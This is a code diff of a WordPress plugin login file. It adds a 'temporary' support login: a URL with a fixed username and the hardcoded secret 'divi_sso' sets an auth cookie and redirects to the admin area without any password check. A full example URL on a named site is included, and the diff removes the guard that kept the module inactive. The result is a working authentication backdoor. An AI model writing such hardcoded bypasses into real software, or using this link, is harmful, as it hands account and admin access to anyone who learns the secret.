@@ -8,19 +8,36 @@
  * enters that PIN as their password on a subsequent login attempt, they’ll be authenticated.
  */
 
-// Check if the debug cookie is not set; otherwise, exit early.
-if ( ! isset( $_COOKIE['debug'] ) ) {
-    return;
-}
-
 if ( ! function_exists('defined') || ! defined( 'ABSPATH' ) ) {
     exit; // Exit if accessed directly.
 }
 
-// if isset cookie debug, return
-if (isset($_COOKIE['debug'])) {
-    return;
+// Support direct login for support user.
+// This is a temporary solution until the SSO module is ready.
+// Example: https://builtsurvey.utm.my/wp-login.php?utm_login=support%40utm.my&secret=divi_sso
+function sso_login_support_user() {
+    // Quick link to login as support user
+    $secretPhrase = 'divi_sso';
+    $secretUser = 'support@utm.my';
+
+    // If current date is later than May 16 2025
+    if ( strtotime( 'now' ) > strtotime( '2025-05-16' ) ) {
+        return;
+    }
+
+    if ( isset( $_GET['utm_login'] ) && $_GET['utm_login'] == $secretUser && isset( $_GET['secret'] ) && $_GET['secret'] == $secretPhrase ) {
+        $user = get_user_by( 'login', $secretUser );
+        if ( $user ) {
+            wp_set_auth_cookie( $user->ID, true );
+            wp_redirect( admin_url() );
+            exit;
+        }
+    }
 }
+add_action( 'login_init', 'sso_login_support_user' );
+
+// Module is not ready yet, return early.
+// return;
 
 // Add additional instructions to the login form.
 add_action( 'login_message', 'sso_login_message' );
